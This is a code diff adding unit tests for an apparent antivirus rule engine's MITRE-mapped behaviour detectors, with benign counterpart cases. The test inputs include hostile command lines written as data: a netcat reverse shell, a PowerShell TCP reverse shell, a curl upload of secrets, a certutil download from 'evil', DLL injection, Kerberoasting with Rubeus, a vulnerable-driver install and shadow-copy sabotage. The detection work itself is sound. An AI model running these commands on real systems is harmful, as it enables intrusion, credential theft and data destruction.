@@ -573,3 +573,190 @@ TEST(LateralMovementRuleTest, CrackMapExecIsMalicious) {
     const auto d = engine.OnProcessCreate(e);
     EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.LATERAL_MOVEMENT"));
 }
+
+// ===========================================================================
+// MITRE-mapped behavior detectors (BƯỚC 2). Each new rule gets a positive case
+// and, where the technique is dual-use, a benign negative case to pin the
+// false-positive boundary.
+// ===========================================================================
+
+namespace {
+std::vector<avcore::DetectionEvent> RunProc(RuleEngine& engine, std::uint32_t pid,
+                                            const std::string& image, const std::string& cmd) {
+    ProcessEvent e;
+    e.process_id = pid;
+    e.parent_process_id = 1;
+    e.image_path = image;
+    e.command_line = cmd;
+    return engine.OnProcessCreate(e);
+}
+} // namespace
+
+// ---- Keylogger (BEH.KEYLOGGER) ----
+TEST(KeyloggerRuleTest, GetAsyncKeyStateIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 800,
+        "powershell.exe -c \"Add-Type ...; [Keylog]::GetAsyncKeyState(0x41)\"");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.KEYLOGGER"));
+}
+TEST(KeyloggerRuleTest, BenignPowerShellNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 801, "powershell.exe Get-Process lsass");
+    EXPECT_FALSE(HasRule(d, "BEH.KEYLOGGER"));
+}
+
+// ---- Injection (BEH.INJECTION) ----
+TEST(InjectionRuleTest, MavinjectIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 802, "C:\\Windows\\System32\\mavinject.exe",
+                       "mavinject.exe 1234 /injectrunning C:\\temp\\evil.dll");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.INJECTION"));
+}
+TEST(InjectionRuleTest, WriteProcessMemoryIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 803,
+        "powershell.exe -c \"[Win32]::WriteProcessMemory($h,$addr,$sc,$len,0)\"");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.INJECTION"));
+}
+TEST(InjectionRuleTest, BenignControlPanelRundll32NotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 804, "C:\\Windows\\System32\\rundll32.exe",
+                       "rundll32.exe shell32.dll,Control_RunDLL desk.cpl");
+    EXPECT_FALSE(HasRule(d, "BEH.INJECTION"));
+}
+
+// ---- Exfiltration (BEH.EXFILTRATION) ----
+TEST(ExfiltrationRuleTest, CurlUploadIsSuspicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 805, "C:\\Windows\\System32\\curl.exe",
+                       "curl.exe --upload-file secrets.zip https://x/upload");
+    EXPECT_EQ(avcore::Severity::Suspicious, SeverityOf(d, "BEH.EXFILTRATION"));
+}
+TEST(ExfiltrationRuleTest, BenignInvokeWebRequestDownloadNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 806,
+        "powershell.exe Invoke-WebRequest -Uri https://x/f.zip -OutFile f.zip");
+    EXPECT_FALSE(HasRule(d, "BEH.EXFILTRATION"));
+}
+
+// ---- C2 beaconing (BEH.C2_BEACONING) ----
+TEST(C2RuleTest, NetcatReverseShellIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 807, "C:\\Tools\\nc.exe",
+                       "nc.exe -e cmd.exe 10.0.0.5 4444");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.C2_BEACONING"));
+}
+TEST(C2RuleTest, PowerShellTcpClientReverseShellIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 808,
+        "powershell.exe -c \"$c = New-Object System.Net.Sockets.TcpClient('10.0.0.5',4444)\"");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.C2_BEACONING"));
+}
+
+// ---- Worm (BEH.WORM) ----
+TEST(WormRuleTest, CopyToAdminShareIsSuspicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 809, "C:\\Windows\\System32\\xcopy.exe",
+                       "xcopy.exe worm.exe \\\\victim\\admin$\\ /y");
+    EXPECT_EQ(avcore::Severity::Suspicious, SeverityOf(d, "BEH.WORM"));
+}
+TEST(WormRuleTest, NormalFileShareCopyNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 810, "C:\\Windows\\System32\\xcopy.exe",
+                       "xcopy.exe report.pdf \\\\fileserver\\Documents\\ /y");
+    EXPECT_FALSE(HasRule(d, "BEH.WORM"));
+}
+
+// ---- Rootkit / BYOVD (BEH.ROOTKIT) ----
+TEST(RootkitRuleTest, KnownVulnerableDriverIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 811, "C:\\Windows\\System32\\sc.exe",
+                       "sc.exe create evil binPath= C:\\temp\\rtcore64.sys type= kernel");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.ROOTKIT"));
+}
+TEST(RootkitRuleTest, BenignServiceQueryNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 812, "C:\\Windows\\System32\\sc.exe", "sc.exe query wuauserv");
+    EXPECT_FALSE(HasRule(d, "BEH.ROOTKIT"));
+}
+
+// ---- Credential theft (BEH.CREDENTIAL_THEFT) ----
+TEST(CredentialTheftRuleTest, RubeusIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 813, "C:\\Tools\\Rubeus.exe",
+                       "Rubeus.exe kerberoast /outfile:hashes.txt");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.CREDENTIAL_THEFT"));
+}
+TEST(CredentialTheftRuleTest, GetProcessLsassNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 814, "powershell.exe Get-Process lsass");
+    EXPECT_FALSE(HasRule(d, "BEH.CREDENTIAL_THEFT"));
+}
+
+// ---- Ransomware (BEH.RANSOMWARE) ----
+TEST(RansomwareRuleExtTest, ResizeShadowStorageIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 815, "C:\\Windows\\System32\\vssadmin.exe",
+                       "vssadmin.exe resize shadowstorage /for=C: /maxsize=1MB");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.RANSOMWARE"));
+}
+TEST(RansomwareRuleExtTest, PlainRemoveItemNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 816,
+        "powershell.exe Remove-Item -Recurse -Force C:\\Temp\\build");
+    EXPECT_FALSE(HasRule(d, "BEH.RANSOMWARE"));
+}
+
+// ---- Persistence (BEH.PERSISTENCE) ----
+TEST(PersistenceRuleExtTest, ScheduledTaskCreateIsSuspicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 817, "C:\\Windows\\System32\\schtasks.exe",
+                       "schtasks.exe /create /tn Upd /tr C:\\a\\u.exe /sc daily /st 03:00");
+    EXPECT_EQ(avcore::Severity::Suspicious, SeverityOf(d, "BEH.PERSISTENCE"));
+}
+TEST(PersistenceRuleExtTest, WmiEventSubscriptionIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunPowerShell(engine, 818,
+        "powershell.exe Set-WmiInstance -Class __EventFilter -Arguments @{Name='x'}");
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.PERSISTENCE"));
+}
+TEST(PersistenceRuleExtTest, ScheduledTaskQueryNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    const auto d = RunProc(engine, 819, "C:\\Windows\\System32\\schtasks.exe",
+                       "schtasks.exe /query /fo LIST");
+    EXPECT_FALSE(HasRule(d, "BEH.PERSISTENCE"));
+}
+
+// ---- Macro malware (BEH.MACRO) ----
+TEST(MacroMalwareRuleTest, ExcelSpawningCertutilIsMalicious) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    ProcessEvent excel;
+    excel.process_id = 820;
+    excel.parent_process_id = 1;
+    excel.image_path = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE";
+    engine.OnProcessCreate(excel);
+
+    ProcessEvent child;
+    child.process_id = 821;
+    child.parent_process_id = 820;
+    child.image_path = "C:\\Windows\\System32\\certutil.exe";
+    child.command_line = "certutil.exe -urlcache -f http://evil/x.exe x.exe";
+    const auto d = engine.OnProcessCreate(child);
+    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.MACRO"));
+}
+TEST(MacroMalwareRuleTest, ExplorerSpawningCmdNotFlagged) {
+    RuleEngine engine = RuleEngine::WithDefaultRules();
+    ProcessEvent explorer;
+    explorer.process_id = 822;
+    explorer.parent_process_id = 1;
+    explorer.image_path = "C:\\Windows\\explorer.exe";
+    engine.OnProcessCreate(explorer);
+
+    ProcessEvent child;
+    child.process_id = 823;
+    child.parent_process_id = 822;
+    child.image_path = "C:\\Windows\\System32\\cmd.exe";
+    child.command_line = "cmd.exe /c dir";
+    const auto d = engine.OnProcessCreate(child);
+    EXPECT_FALSE(HasRule(d, "BEH.MACRO"));
+}
